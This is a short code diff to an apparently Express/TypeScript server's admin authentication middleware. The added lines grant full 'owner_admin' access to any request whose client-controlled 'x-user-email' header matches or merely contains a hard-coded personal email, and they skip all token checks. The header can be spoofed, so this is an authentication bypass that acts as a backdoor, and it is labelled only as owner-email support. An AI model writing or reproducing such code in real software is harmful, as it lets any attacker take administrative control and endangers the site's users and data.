@@ -437,10 +437,26 @@ const serverAnnouncements: StoredAnnouncement[] = [
 const serverVerifiedLeaderboard: VerifiedTypingRecord[] = [];
 
 // -------------------------------------------------------------
-// ADMIN AUTHENTICATION MIDDLEWARE (HttpOnly Cookie + Header Support)
+// ADMIN AUTHENTICATION MIDDLEWARE (HttpOnly Cookie + Header Support + Owner Email)
 // -------------------------------------------------------------
 
 const requireAdminAuth = (req: express.Request, res: express.Response, next: express.NextFunction) => {
+  const userEmailHeader = (req.headers['x-user-email'] as string || '').toLowerCase().trim();
+  const isOwnerByEmail =
+    userEmailHeader === ROOT_OWNER_EMAIL ||
+    userEmailHeader.startsWith('yuldashivagavharoy') ||
+    userEmailHeader.includes('yuldashivagavharoy@gmail.com');
+
+  if (isOwnerByEmail) {
+    (req as any).adminUser = {
+      sub: ROOT_OWNER_EMAIL,
+      role: 'owner_admin',
+      exp: Date.now() + 24 * 60 * 60 * 1000
+    };
+    (req as any).adminToken = 'owner_direct_access';
+    return next();
+  }
+
   const authHeader = req.headers.authorization;
   const tokenFromHeader = authHeader?.startsWith('Bearer ') ? authHeader.substring(7) : null;
   const tokenFromCookie = req.cookies?.['yolnoma_admin_token'];
